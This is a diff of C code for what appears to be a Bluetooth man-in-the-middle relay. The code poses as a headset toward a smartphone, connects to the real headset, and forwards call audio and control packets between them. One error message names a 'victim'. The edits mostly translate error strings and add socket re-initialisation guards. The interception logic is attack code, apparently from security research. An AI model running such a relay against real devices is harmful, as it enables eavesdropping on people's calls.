@@ -9,25 +9,25 @@ int rfcomm_fone_socket = -1;
 int sco_tel_socket = -1;
 int sco_fone_socket = -1;
 
-char endr_adap_hs_literal[18];
+char endr_adap_fone_literal[18];
 char endr_fone_literal[18];
 
 void definir_endr_adap_hs_literal(char* endr)
 {
-    strcpy(endr_adap_hs_literal, endr);
-    printf("%s\n", endr_adap_hs_literal);
+    strcpy(endr_adap_fone_literal, endr);
 }
 
 void definir_endr_fone_literal(char* endr)
 {
     strcpy(endr_fone_literal, endr);
-    printf("%s\n", endr_fone_literal);
 }
 
 int inicializa_sockets_tel()
 {
-    rfcomm_socket_tel(3);
-    printf("Socket RFCOMM smartphone %d\n", rfcomm_tel_socket);
+    if(rfcomm_tel_socket == -1){
+        rfcomm_socket_tel(3);
+        printf("Socket RFCOMM smartphone %d\n", rfcomm_tel_socket);
+    }
 
     sco_socket_tel();
     printf("Socket SCO smartphone %d\n", sco_tel_socket);
@@ -54,19 +54,19 @@ int rfcomm_socket_tel(uint8_t porta)
     /* Configura o socket definindo o adaptador que simula o headset,
      * como o "servidor" da conexão */
     endereco_local.rc_family = AF_BLUETOOTH;
-    str2ba(endr_adap_hs_literal,&endereco_local.rc_bdaddr);
+    str2ba(endr_adap_fone_literal,&endereco_local.rc_bdaddr);
     endereco_local.rc_channel = porta;
 
     if (bind(sock, (struct sockaddr*) &endereco_local, 
              sizeof (struct sockaddr_rc)) < 0) {
-        perror("RFCOMM smartphone bind ERROR");
+        perror("ERRO bind RFCOMM smartphone");
         return -1;
     }
 
     printf("Aguardando conexão do smartphone ao socket RFCOMM\n");
 
     if (listen(sock, 1) < 0) {
-        perror("RFCOMM smartphone listen ERROR");
+        perror("ERRO listen RFCOMM smartphone");
         return -1;
     }
 
@@ -83,7 +83,7 @@ int rfcomm_socket_tel(uint8_t porta)
         rfcomm_tel_socket = cliente;
         return cliente;
     } else {
-        printf("RFCOMM smartphone accept ERROR\n");
+        printf("ERRO accept RFCOMM smartphone\n");
         return -1;
     }
 }
@@ -105,25 +105,25 @@ int sco_socket_tel()
     erro = setsockopt(sock, SOL_BLUETOOTH, BT_VOICE, &codec_voz, 
                       sizeof (codec_voz));
     if (erro < 0) {
-        perror("SCO smartphone setsockopt voice ERROR");
+        perror("ERRO setsockopt voice SCO smartphone");
         return -1;
     }
 
     /* Assim como na inicialização do socket RFCOMM, define o adaptador 
      * que simula o headset, como o "servidor" da conexão */
     endereco_local.sco_family = AF_BLUETOOTH;
-    str2ba(endr_adap_hs_literal,&endereco_local.sco_bdaddr);
+    str2ba(endr_adap_fone_literal,&endereco_local.sco_bdaddr);
 
     if (bind(sock, (struct sockaddr*) &endereco_local, 
              sizeof (struct sockaddr_sco)) < 0) {
-        perror("SCO smartphone bind ERROR");
+        perror("ERRO bind SCO smartphone");
         return -1;
     }
 
     printf("Aguardando conexão do smartphone ao socket SCO\n");
 
     if (listen(sock, 1) < 0) {
-        perror("SCO smartphone listen ERROR");
+        perror("ERRO listen SCO smartphone");
         return -1;
     }
 
@@ -137,7 +137,7 @@ int sco_socket_tel()
                 endr_tel_literal, cliente);
         sco_tel_socket = cliente;
     } else {
-        printf("SCO smartphone accept ERROR\n");
+        printf("ERRO accept SCO smartphone\n");
         return -1;
     }
 
@@ -147,7 +147,7 @@ int sco_socket_tel()
     int so_size = sizeof (so);
     erro = getsockopt(cliente, SOL_SCO, SCO_OPTIONS, &so, &so_size);
     if (erro < 0) {
-        perror("SCO smartphone getsockopt mtu ERROR");
+        perror("ERRO getsockopt mtu SCO smartphone");
         return -1;
     }
     sco_mtu = so.mtu;
@@ -159,8 +159,10 @@ int sco_socket_tel()
 
 int inicializa_sockets_fone()
 {
-    rfcomm_socket_fone(4);
-    printf("Socket RFCOMM headset %d\n", rfcomm_fone_socket);
+    if(rfcomm_fone_socket == -1){
+        rfcomm_socket_fone(4);
+        printf("Socket RFCOMM headset %d\n", rfcomm_fone_socket);
+    }
 
     sco_socket_fone();
     printf("Socket SCO headset %d\n", sco_fone_socket);
@@ -199,7 +201,7 @@ int rfcomm_socket_fone(uint8_t porta)
         rfcomm_fone_socket = sock;
         return status;
     } else {
-        printf("RFCOMM headset connect ERROR\n");
+        printf("ERRO connect RFCOMM headset\n");
         return -1;
     }
 
@@ -221,7 +223,7 @@ int sco_socket_fone()
     erro = setsockopt(sock, SOL_BLUETOOTH, BT_VOICE, &codec_voz, 
                       sizeof (codec_voz));
     if (erro < 0) {
-        perror("SCO headset setsockopt voice ERROR");
+        perror("ERRO setsockopt voice SCO headset");
         return -1;
     }
 
@@ -238,7 +240,7 @@ int sco_socket_fone()
                 endr_fone_literal, sock);
         sco_fone_socket = sock;
     } else {
-        printf("SCO headset connect ERROR\n");
+        printf("ERRO connect SCO headset\n");
         return -1;
     }
 
@@ -249,7 +251,7 @@ int sco_socket_fone()
     so.mtu = sco_mtu;
     erro = setsockopt(sock, SOL_SCO, SCO_OPTIONS, &so, &so_size);
     if (erro < 0) {
-        perror("SCO Vítima B setsockopt mtu ERROR");
+        perror("ERRO setsockopt mtu SCO Vítima B");
         return -1;
     }
 
@@ -291,7 +293,7 @@ int loop_chamada()
          * encaminhamento para o headset */
         if ((compr_pact_tel_sco = recv(sco_tel_socket, scobuffer, 
                                     sizeof (scobuffer), 0)) <= 0) {
-            perror("RX sco smartphone ERROR");
+            perror("ERRO RX sco smartphone");
             break;
         }
         printf("RX sco smartphone: %d sock: %d\n", compr_pact_tel_sco, sco_tel_socket);
@@ -313,7 +315,7 @@ int loop_chamada()
          * ocorreu alguma falha que tenha bloqueado o socket, 
          * exigindo a interrupção do loop */
         if (compr_pact_tel_rfcomm < 0 && errno != EWOULDBLOCK) {
-            perror("RX rfcomm smartphone ERROR");
+            perror("ERRO RX rfcomm smartphone");
             break;
         } else if (compr_pact_tel_rfcomm > 0) {
             compr_pact_fone_rfcomm = send(rfcomm_fone_socket, rfcommbuffer, 
@@ -325,7 +327,7 @@ int loop_chamada()
         /* Envia os pacotes de áudio provenientes do smartphone
          * que estão armazenados no buffer, para o headset */
         if ((compr_pact_fone_sco = send(sco_fone_socket, scobuffer, 48, 0)) <= 0) {
-            perror("TX sco headset ERROR");
+            perror("ERRO TX sco headset");
             break;
         }
         printf("TX sco headset: %d sock: %d\n", compr_pact_fone_sco, sco_fone_socket);
@@ -334,7 +336,7 @@ int loop_chamada()
          * e armazena no buffer para posterior execução e 
          * encaminhamento para o smartphone */
         if ((compr_pact_fone_sco = recv(sco_fone_socket, scobuffer, 48, 0)) <= 0) {
-            perror("RX sco headset ERROR: ");
+            perror("ERRO RX sco headset");
             break;
         }
         printf("RX sco headset: %d sock: %d\n", compr_pact_fone_sco, sco_fone_socket);
@@ -356,7 +358,7 @@ int loop_chamada()
          * ocorreu alguma falha que tenha bloqueado o socket, 
          * exigindo a interrupção do loop */
         if (compr_pact_fone_rfcomm < 0 && errno != EWOULDBLOCK) {
-            perror("RX rfcomm headset ERROR");
+            perror("ERRO RX rfcomm headset");
             break;
         } else if (compr_pact_fone_rfcomm > 0) {
             compr_pact_tel_rfcomm = send(rfcomm_tel_socket, rfcommbuffer, 
@@ -367,7 +369,7 @@ int loop_chamada()
         /* Envia os pacotes de áudio provenientes do headset
          * que estão armazenados no buffer, para o smartphone */
         if ((compr_pact_tel_sco = send(sco_tel_socket, scobuffer, 48, 0)) <= 0) {
-            perror("TX sco smartphone ERROR");
+            perror("ERRO TX sco smartphone");
             break;
         }
         printf("TX sco smartphone: %d sock: %d\n", compr_pact_tel_sco, sco_tel_socket);
